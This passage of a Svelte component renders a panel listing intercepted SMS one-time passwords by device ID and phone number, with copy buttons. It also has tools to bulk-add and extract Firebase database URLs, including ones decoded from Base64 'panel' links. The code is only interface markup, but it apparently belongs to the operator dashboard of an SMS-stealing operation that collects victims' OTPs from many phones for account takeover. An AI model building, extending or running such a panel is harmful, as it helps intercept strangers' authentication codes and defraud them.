        bind:this={bellPanelEl}
        class="bell-panel {_nrResizing ? 'bp-resizing' : ''} {_ndDragging ? 'bp-dragging' : ''}"
        style="transform:translate({notifPanelPos.x}px,{notifPanelPos.y}px); width:{notifPanelWidth}px; {notifPanelHeight ? `height:${notifPanelHeight}px;` : ''}"
      >
        <!-- Large screen resize handle: Left border -->
        <div
          class="bp-resize-edge bp-resize-left"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('left', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize width · Double-click to reset"
          aria-hidden="true"
        ></div>

        <!-- Large screen resize handle: Bottom border -->
        <div
          class="bp-resize-edge bp-resize-bottom"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('bottom', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize height · Double-click to reset"
          aria-hidden="true"
        ></div>

        <!-- Large screen resize handle: Bottom-left corner -->
        <div
          class="bp-resize-corner bp-resize-bl"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('bl', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize width & height · Double-click to reset"
          aria-hidden="true"
        ></div>

        <!-- Large screen resize handle: Bottom-right corner with visual grip dots -->
        <div
          class="bp-resize-corner bp-resize-br"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('br', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize · Double-click to reset"
          aria-hidden="true"
        >
          <svg width="10" height="10" viewBox="0 0 10 10" fill="none" class="bp-grip-icon">
            <circle cx="8" cy="8" r="1" fill="currentColor" />
            <circle cx="8" cy="5" r="1" fill="currentColor" />
            <circle cx="8" cy="2" r="1" fill="currentColor" />
            <circle cx="5" cy="8" r="1" fill="currentColor" />
            <circle cx="5" cy="5" r="1" fill="currentColor" />
            <circle cx="2" cy="8" r="1" fill="currentColor" />
          </svg>
        </div>

        <!-- Draggable panel header -->
        <div
          class="bp-hdr bp-drag-handle"
          role="toolbar"
          tabindex="0"
          aria-label="Notification panel header drag handle"
          onpointerdown={notifPanelDragStart}
          onpointermove={notifPanelDragMove}
          onpointerup={notifPanelDragEnd}
          onpointercancel={notifPanelDragEnd}
          ondblclick={resetNotifPanelSize}
          style="cursor:{_ndDragging
            ? 'grabbing'
            : 'grab'};touch-action:none;user-select:none"
        >
          <span class="bp-title"
            >Notifications {#if notifications.length > 0}<span class="bp-cnt"
                >({notifSearchQuery.trim()
                  ? `${filteredNotifications.length}/${notifications.length}`
                  : notifications.length})</span
              >{/if}</span
          >
          <div class="bp-actions" role="toolbar" tabindex="-1" aria-label="Notification actions" onpointerdown={(e) => e.stopPropagation()}>
            <!-- Mute toggle -->
            <button
              class="bp-icon-btn {!notifsEnabled ? 'bp-muted' : ''}"
              onclick={(e) => {
                e.stopPropagation();
                toggleNotifsEnabled();
              }}
              title={notifsEnabled ? "Mute" : "Unmute"}
              aria-label="Toggle mute"
            >
              {#if notifsEnabled}
                <svg
                  width="13"
                  height="13"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                    d="M13.73 21a2 2 0 0 1-3.46 0"
                  /></svg
                >
              {:else}
                <svg
                  width="13"
                  height="13"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                    d="M13.73 21a2 2 0 0 1-3.46 0"
                  /><line x1="2" y1="2" x2="22" y2="22" /></svg
                >
              {/if}
            </button>
            <!-- Reset size/position button if custom size or position -->
            {#if notifPanelWidth !== 360 || notifPanelHeight !== null || notifPanelPos.x !== 0 || notifPanelPos.y !== 0}
              <button
                class="bp-icon-btn"
                onclick={(e) => {
                  e.stopPropagation();
                  resetNotifPanelSize();
                }}
                title="Reset panel size and position"
                aria-label="Reset panel size and position"
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  ><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8" /><path
                    d="M3 3v5h5"
                  /></svg
                >
              </button>
            {/if}
            <!-- Clear all -->
            {#if notifications.length > 0}
              <button
                class="bp-icon-btn bp-clear-btn"
                onclick={(e) => {
                  e.stopPropagation();
                  clearAllNotifs();
                }}
                title="Clear all notifications"
                aria-label="Clear all notifications"
              >
                <svg
                  width="13"
                  height="13"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><polyline points="3 6 5 6 21 6" /><path
                    d="M19 6l-1 14H6L5 6"
                  /><path d="M10 11v6M14 11v6" /></svg
                >
              </button>
            {/if}
            <!-- Collapse / Close cross button -->
            <button
              class="bp-icon-btn bp-close-btn"
              onclick={(e) => {
                e.stopPropagation();
                showBellPanel = false;
              }}
              title="Close panel"
              aria-label="Close"
            >
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12" /></svg
              >
            </button>
          </div>
        </div>

        <!-- Notification Search / Filter Bar -->
        <div class="bp-search-wrap" role="search" aria-label="Filter notifications" onpointerdown={(e) => e.stopPropagation()}>
          <div class="bp-search-box">
            <svg class="bp-search-ico" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
              <circle cx="11" cy="11" r="8" />
              <line x1="21" y1="21" x2="16.65" y2="16.65" />
            </svg>
            <input
              type="text"
              class="bp-search-input"
              placeholder="Filter OTPs (e.g. Swiggy, Jio)..."
              bind:value={notifSearchQuery}
            />
            {#if notifSearchQuery}
              <button
                class="bp-search-clear"
                onclick={() => (notifSearchQuery = "")}
                title="Clear filter"
                aria-label="Clear filter"
              >×</button>
            {/if}
          </div>
          {#if notifSearchQuery.trim()}
            <div class="bp-search-status">
              <span>Filtered: {filteredNotifications.length} of {notifications.length}</span>
              {#if filteredNotifications.length === 0}
                <span style="color:#ef4444">No match</span>
              {/if}
            </div>
          {/if}
        </div>

        <!-- Notification list -->
        {#if notifications.length === 0}
          <div class="bp-empty">
            {#if !notifsEnabled}
              <span>🔕 Notifications muted</span>
            {:else}
              <span>No new notifications</span>
            {/if}
          </div>
        {:else if filteredNotifications.length === 0}
          <div class="bp-empty bp-empty-filtered">
            <span>No notifications matching "{notifSearchQuery}"</span>
            <button
              class="bp-search-reset-btn"
              onclick={() => (notifSearchQuery = "")}
            >
              Clear Filter
            </button>
          </div>
        {:else}
          <div class="bp-list">
            {#each filteredNotifications as n (n.id)}
              {@const msgFull = n.message ?? ""}
              {@const msgShort =
                msgFull.length > 120 ? msgFull.slice(0, 120) + "…" : msgFull}
              {@const remainingSec = getRemainingNotifSecs(n.createdAt, nowTick)}
              <div class="bp-card {n.leaving ? 'nleave' : ''}">
                <!-- Row 1: App icon + sender + OTP label + time + dismiss -->
                <div class="bp-card-top">
                  <div
                    class="bp-app-icon"
                    style="background:{n.conn?.color ??
                      '#f97316'}22;border-color:{n.conn?.color ?? '#f97316'}44"
                  >
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke={n.conn?.color ?? "#f97316"}
                      stroke-width="2"
                      ><rect x="5" y="2" width="14" height="20" rx="2" /><path
                        d="M12 18h.01"
                      /></svg
                    >
                  </div>
                  <div class="bp-card-mid">
                    <span class="bp-sender"
                      >{n.sender ?? "?"}{n.about ? ` · ${n.about}` : ""} ·
                      <span style="color:#64748b">OTP</span></span
                    >
                    <span class="bp-msg-preview">{msgShort}</span>
                  </div>
                  <div class="bp-time-col">
                    <span class="bp-time">{toIST(n.ts)}</span>
                    <span
                      class="bp-countdown-badge {remainingSec <= 10 ? 'bp-countdown-ending' : ''}"
                      title="Stays in notification box for {remainingSec}s"
                    >
                      <span class="bp-countdown-dot"></span>{remainingSec}s
                    </span>
                  </div>
                  <button
                    class="n-close"
                    onclick={(e) => {
                      e.stopPropagation();
                      dismissNotif(n.id);
                    }}
                    title="Dismiss notification"
                    aria-label="Dismiss">×</button
                  >
                </div>
                <!-- Row 2: OTP green pill + device ID + copy + navigate -->
                {#if n.otp}
                  {@const notifPhone = getDisplayPhone(n.connId, n.devKey, getDevInfo(n.connId, n.devKey))}
                  <div class="bp-card-bot">
                    <button
                      class="bp-otp-pill"
                      onclick={() => {
                        copyText(n.otp);
                        toast(`OTP ${n.otp} copied!`, "success");
                      }}
                      title="Tap to copy OTP"
                    >
                      <svg
                        width="11"
                        height="11"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2.5"
                        style="opacity:0.6"
                        ><rect
                          x="3"
                          y="11"
                          width="18"
                          height="11"
                          rx="2"
                        /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg
                      >
                      <code class="bp-otp-code">{n.otp}</code>
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                        /></svg
                      >
                    </button>
                    <button
                      class="bp-dev-pill"
                      onclick={(e) => {
                        e.stopPropagation();
                        copyText(n.devKey ?? "");
                        toast("Device ID copied", "success");
                      }}
                      title="Copy device ID"
                    >
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="5" y="2" width="14" height="20" rx="2" /></svg
                      >
                      <span class="mono">{n.devKey ?? ""}</span>
                      <svg
                        width="9"
                        height="9"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                        /></svg
                      >
                    </button>
                    {#if notifPhone}
                      <button
                        class="bp-phone-pill"
                        onclick={(e) => {
                          e.stopPropagation();
                          copyPhone(notifPhone);
                        }}
                        title="Copy phone number"
                      >📱 {notifPhone}</button>
                    {/if}
                    <!-- Navigate button -->
                    <button
                      class="bp-nav-btn"
                      onclick={() => {
                        navigateToDevice(n.connId, n.devKey);
                        showBellPanel = false;
                      }}
                      title="Go to device"
                    >
                      <svg
                        width="13"
                        height="13"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2.5"
                        ><path d="M7 17L17 7M7 7h10v10" /></svg
                      >
                    </button>
                    <!-- Green progress bar -->
                    <div
                      class="bp-progress"
                      style="animation-delay: -{n.initialElapsedSec ?? 0}s;"
                    ></div>
                  </div>
                {:else}
                  {@const notifPhoneV = getDisplayPhone(n.connId, n.devKey, getDevInfo(n.connId, n.devKey))}
                  <div class="bp-card-bot">
                    <span class="bp-verif-chip">VERIF</span>
                    <span class="bp-verif-text"
                      >{msgFull.slice(0, 40)}{msgFull.length > 40
                        ? "…"
                        : ""}</span
                    >
                    {#if notifPhoneV}
                      <button
                        class="bp-phone-pill"
                        onclick={(e) => {
                          e.stopPropagation();
                          copyPhone(notifPhoneV);
                        }}
                        title="Copy phone number"
                      >📱 {notifPhoneV}</button>
                    {/if}
                    <button
                      class="bp-dev-pill"
                      onclick={(e) => {
                        e.stopPropagation();
                        copyText(n.devKey ?? "");
                        toast("Device ID copied", "success");
                      }}
                      title="Copy device ID"
                    ><span class="mono">{n.devKey ?? ""}</span></button>
                    <button
                      class="bp-nav-btn"
                      onclick={() => {
                        navigateToDevice(n.connId, n.devKey);
                        showBellPanel = false;
                      }}
                      aria-label="View device"
                      title="View device"
                    >
                      <svg
                        width="13"
                        height="13"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2.5"
                        ><path d="M7 17L17 7M7 7h10v10" /></svg
                      >
                    </button>
                    <!-- Green progress bar -->
                    <div
                      class="bp-progress"
                      style="animation-delay: -{n.initialElapsedSec ?? 0}s;"
                    ></div>
                  </div>
                {/if}
              </div>
            {/each}
          </div>
        {/if}
      </div>
    {/if}

    <!-- Add Firebase panel -->
    {#if addOpen}
      <div class="add-panel">
        <div class="ap-hdr">
          <span>Add Firebase Connection</span>
        <div class="ap-mode-toggle">
            <button class="ap-mode-btn {addPanelMode === 'single' ? 'ap-mode-active' : ''}" onclick={() => addPanelMode='single'}>Single</button>
            <button class="ap-mode-btn {addPanelMode === 'bulk' ? 'ap-mode-active' : ''}" onclick={() => addPanelMode='bulk'}>Bulk</button>
            <button class="ap-mode-btn {addPanelMode === 'extract' ? 'ap-mode-active' : ''}" onclick={() => addPanelMode='extract'}>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
              Extract
            </button>
          </div>
          <button class="ico-btn" onclick={() => (addOpen = false)} aria-label="Close">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12" /></svg>
          </button>
        </div>

        {#if addPanelMode === 'single'}
          <div class="ap-grid">
            <div class="field"><label for="fn">Name</label><input id="fn" bind:value={form.name} placeholder="project-name" /></div>
            <div class="field"><label for="fu">Firebase URL</label><input id="fu" bind:value={form.url} onpaste={handleUrlPaste} placeholder="https://xxx-default-rtdb.firebaseio.com" /></div>
            <div class="field"><label for="fp">Messages Path</label><input id="fp" bind:value={form.path} placeholder="messages" /></div>
            <div class="field"><label for="fi">Device Info Path</label><input id="fi" bind:value={form.infoPath} placeholder="devices (optional)" /></div>
            <div class="field"><label for="ft">Auth Token</label><input id="ft" type="password" bind:value={form.token} placeholder="optional" /></div>
          </div>
          <div class="ap-foot">
            <button class="btn btn-ghost" onclick={() => (addOpen = false)}>Cancel</button>
            <button class="btn btn-primary" onclick={addConn}>Connect</button>
          </div>
        {:else if addPanelMode === 'bulk'}
          <div class="bulk-area">
            <div class="bulk-hint">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
              <span>Paste Firebase RTDB URLs — one per line, numbered, comma-separated, or mixed text. All valid URLs are extracted automatically.</span>
            </div>
            <textarea class="bulk-input" bind:value={bulkText} placeholder={`1. https://project1-default-rtdb.firebaseio.com\n2. https://project2-default-rtdb.firebaseio.com\n3. https://project3-default-rtdb.firebaseio.com`} rows="5" aria-label="Bulk Firebase URLs"></textarea>

            <!-- Editable detected URL list -->
            {#if bulkEditableUrls.length}
              <div class="bulk-preview">
                <div class="bulk-preview-hdr">
                  <span class="bulk-count">{bulkEditableUrls.length} URL{bulkEditableUrls.length > 1 ? 's' : ''} detected</span>
                  <div style="display:flex;gap:6px">
                    <button class="bulk-action-btn" onclick={copyAllBulkUrls} title="Copy all URLs">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      Copy All
                    </button>
                    <button class="bulk-action-btn bulk-clear-btn" onclick={() => { bulkText = ''; }} title="Clear all URLs">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/></svg>
                      Clear
                    </button>
                  </div>
                </div>
                <div class="bulk-urls">
                  {#each bulkEditableUrls as item, i (item.url)}
                    <div class="bulk-url-row">
                      <span class="bulk-idx">{i + 1}</span>
                      <input
                        class="bulk-url-edit"
                        value={item.url}
                        onchange={(e) => updateBulkUrl(item.url, e.currentTarget.value)}
                        aria-label="Firebase URL {i+1}"
                      />
                      {#if item.dup}<span class="bulk-dup">already added</span>{/if}
                      <button class="bulk-rm-btn" onclick={() => removeBulkUrl(item.url)} title="Remove" aria-label="Remove URL">×</button>
                    </div>
                  {/each}
                </div>
              </div>
            {/if}

            <div class="ap-foot">
              <button class="btn btn-ghost" onclick={() => { bulkText=''; addPanelMode='single'; }}>Cancel</button>
              <button class="btn btn-primary" onclick={addBulkConns} disabled={!bulkParsed.length}>
                {#if bulkParsed.filter(u => !connections.find(c => c.url.replace(/\/+$/,'') === u)).length > 0}
                  Add {bulkParsed.filter(u => !connections.find(c => c.url.replace(/\/+$/,'') === u)).length} Connection{bulkParsed.filter(u => !connections.find(c => c.url.replace(/\/+$/,'') === u)).length !== 1 ? 's' : ''}
                {:else}
                  No New URLs
                {/if}
              </button>
            </div>
          </div>
        {:else if addPanelMode === 'extract'}
          <!-- ═══════════════ Universal Extractor ═══════════════ -->
          <div class="ux-container">
            <!-- Input area + file drop zone -->
            <div
              class="ux-drop-zone {uxDragActive ? 'ux-drop-active' : ''}"
              ondragover={uxHandleDragOver}
              ondragleave={uxHandleDragLeave}
              ondrop={uxHandleDrop}
              role="region"
              aria-label="Universal extractor input"
            >
              <div class="ux-input-header">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                <span>Paste anything — URLs, Base64, JSON, or mixed text</span>
              </div>
              <textarea
                class="ux-textarea"
                bind:value={uxInput}
                placeholder={"https://panel.vercel.app/?s=aHR0cHM6Ly8…\nhttps://project-default-rtdb.firebaseio.com\n{\"db\":\"https://…firebaseio.com\"}\naHR0cHM6Ly8… (raw Base64)"}
                aria-label="Universal extraction input"
                rows="4"
                onkeydown={(e) => e.key === 'Enter' && e.ctrlKey && !uxProcessing && uxInput.trim() && uxRunExtract()}
              ></textarea>
              <div class="ux-input-actions">
                <label class="ux-file-btn" title="Upload files">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                  Upload
                  <input type="file" multiple accept=".json,.txt,.csv,.html,.htm,.xml,.tsv,.log,.md,.yaml,.yml,.ini,.cfg,.conf,.toml,.ndjson" onchange={uxHandleFileSelect} style="display:none" />
                </label>
                {#if uxInput || uxResults.length}
                  <button class="ux-clear-input-btn" onclick={uxClear} title="Clear all">
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/></svg>
                    Clear
                  </button>
                {/if}
                <button class="btn btn-primary btn-sm ux-extract-btn" onclick={uxRunExtract} disabled={uxProcessing || !uxInput.trim()}>
                  {#if uxProcessing}
                    <span class="spin-ring" style="width:11px;height:11px;border-width:2px"></span>
                    Extracting…
                  {:else}
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg>
                    Extract
                  {/if}
                </button>
              </div>
              {#if uxDragActive}
                <div class="ux-drop-overlay">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                  <span>Drop files here</span>
                </div>
              {/if}
            </div>

            <!-- Uploaded files tags -->
            {#if uxUploadedFiles.length}
              <div class="ux-uploaded-files">
                {#each uxUploadedFiles as f}
                  <span class="ux-file-tag">
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                    {f.name}
                    <span class="ux-file-tag-count">{f.resultCount}</span>
                  </span>
                {/each}
              </div>
            {/if}

            <!-- Errors -->
            {#if uxErrors.length}
              <div class="ux-errors">
                {#each uxErrors as err}
                  <div class="ux-error-item">
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>
                    {err}
                  </div>
                {/each}
              </div>
            {/if}

            <!-- Stats bar -->
            {#if uxStats}
              <div class="ux-stats-bar">
                <div class="ux-stat-item">
                  <span class="ux-stat-label">Input</span>
                  <span class="ux-stat-value">{uxStats.totalInput}</span>
                </div>
                <div class="ux-stat-sep"></div>
                <div class="ux-stat-item ux-stat-success">
                  <span class="ux-stat-label">Success</span>
                  <span class="ux-stat-value">{uxStats.successCount}</span>
                </div>
                <div class="ux-stat-sep"></div>
                <div class="ux-stat-item">
                  <span class="ux-stat-label">Unique</span>
                  <span class="ux-stat-value">{uxStats.uniqueCount}</span>
                </div>
                {#if uxStats.duplicateCount > 0}
                  <div class="ux-stat-sep"></div>
                  <div class="ux-stat-item ux-stat-warn">
                    <span class="ux-stat-label">Duplicates</span>
                    <span class="ux-stat-value">{uxStats.duplicateCount}</span>
                  </div>
                {/if}
                {#if uxStats.malformedCount > 0}
                  <div class="ux-stat-sep"></div>
                  <div class="ux-stat-item ux-stat-error">
                    <span class="ux-stat-label">Failed</span>
                    <span class="ux-stat-value">{uxStats.malformedCount}</span>
                  </div>
                {/if}
              </div>
            {/if}

            <!-- Results -->
            {#if uxResults.length}
              <div class="ux-results">
                <div class="ux-results-header">
                  <div class="ux-results-title">
                    <button class="ux-select-all-btn" onclick={uxToggleAll} title="Toggle all">
                      {#if uxResults.every(r => r.selected)}
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M9 12l2 2 4-4"/></svg>
                      {:else if uxResults.some(r => r.selected)}
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="3"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
                      {:else}
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"/></svg>
                      {/if}
                    </button>
                    <span>{uxResults.length} connection{uxResults.length !== 1 ? 's' : ''} found</span>
                    {#if uxStats && uxStats.duplicateCount > 0}
                      <span class="ux-stat-dim">· {uxStats.duplicateCount} dup{uxStats.duplicateCount !== 1 ? 's' : ''} filtered</span>
                    {/if}
                  </div>
                  <div class="ux-results-actions">
                    <button class="bulk-action-btn" onclick={uxCopySelected} title="Copy selected URLs">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      Copy
                    </button>
                  </div>
                </div>
                <div class="ux-results-list">
                  {#each uxResults as item (item.url)}
                    <div class="ux-result-row {item.selected ? '' : 'ux-result-deselected'}">
                      <button class="ux-result-check" onclick={() => uxToggleResult(item.url)}>
                        {#if item.selected}
                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M9 12l2 2 4-4"/></svg>
                        {:else}
                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#334155" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"/></svg>
                        {/if}
                      </button>
                      <div class="ux-result-info">
                        <input
                          class="ux-result-name"
                          value={item.name}
                          onchange={(e) => uxUpdateName(item.url, e.currentTarget.value)}
                          placeholder="project-name"
                          aria-label="Connection name"
                        />
                        <div class="ux-result-url" title={item.url}>{item.url}</div>
                        <span class="ux-source-tag">{item.source}</span>
                      </div>
                      <div class="ux-result-btns">
                        <button class="ux-action-mini" onclick={() => uxCopyUrl(item.url)} title="Copy URL">
                          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        </button>
                        <button class="ux-action-mini ux-action-remove" onclick={() => uxRemoveResult(item.url)} title="Remove">×</button>
                      </div>
                    </div>
                  {/each}
                </div>
              </div>

              <!-- Malformed entries review -->
              {#if uxMalformed.length}
                <div class="ux-malformed-section">
                  <button class="ux-malformed-toggle" onclick={() => uxShowMalformed = !uxShowMalformed}>
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                      <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                      <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
                    </svg>
                    {uxMalformed.length} entry{uxMalformed.length !== 1 ? 'ies' : 'y'} failed extraction
                    <svg class="ux-malformed-chevron {uxShowMalformed ? 'ux-chevron-open' : ''}" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="6 9 12 15 18 9"/>
                    </svg>
                  </button>
                  {#if uxShowMalformed}
                    <div class="ux-malformed-list">
                      {#each uxMalformed as m, i}
                        <div class="ux-malformed-item">
                          <span class="ux-malformed-idx">{i + 1}</span>
                          <div class="ux-malformed-body">
                            <div class="ux-malformed-line" title={m.line}>{m.line}</div>
                            <div class="ux-malformed-reason">{m.reason}</div>
                          </div>
                        </div>
                      {/each}
                    </div>
                  {/if}
                </div>
              {/if}

              <!-- Footer: Add selected to connections -->
              <div class="ap-foot">
                <button class="btn btn-ghost" onclick={() => { uxClear(); addPanelMode='single'; }}>Cancel</button>
                <button class="btn btn-ghost" onclick={uxAddToBulk}>
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5z"/></svg>
                  Send to Bulk
                </button>
                <button class="btn btn-primary" onclick={uxAddConnections}>
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                  Add {uxResults.filter(r => r.selected).length} Connection{uxResults.filter(r => r.selected).length !== 1 ? 's' : ''}
                </button>
              </div>
            {:else if !uxProcessing && !uxInput.trim() && !uxErrors.length}
              <div class="ux-empty-hint">
                <div class="ux-empty-icon">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                </div>
                <p>Paste any URL, Base64, JSON, or upload a file.</p>
                <p class="ux-empty-sub">The extractor automatically detects and decodes Firebase RTDB connections from any source.</p>
              </div>
            {/if}
          </div>
        {/if}

        <!-- ── Quick Settings ── -->
        <div class="ap-settings">
          <div class="aps-title">System & Notification Settings</div>

          <label class="aps-row">
            <span class="aps-lbl">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                  d="M13.73 21a2 2 0 0 1-3.46 0"
                /></svg
              >
              <span
                >{notifsEnabled
                  ? "Notifications Enabled (Alerts & Sound)"
                  : "Notifications Muted (Silent)"}</span
              >
            </span>
            <button
              class="aps-tog {notifsEnabled ? 'aps-on' : ''}"
              onclick={toggleNotifsEnabled}
              aria-label="Toggle notifications"
            >
              <span class="aps-knob"></span>
            </button>
          </label>

          <label class="aps-row" style="margin-top:8px">
            <span class="aps-lbl">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><rect x="3" y="3" width="18" height="18" rx="2" /><line
                  x1="3"
                  y1="18"
                  x2="21"
                  y2="18"
                /><line x1="8" y1="18" x2="8" y2="21" /><line
                  x1="16"
                  y1="18"
                  x2="16"
                  y2="21"
                /></svg
              >
              <span
                >{showNotifsTab
                  ? "Notifications Tab in Bottom Nav (Visible)"
                  : "Notifications Tab in Bottom Nav (Hidden)"}</span
              >
            </span>
            <button
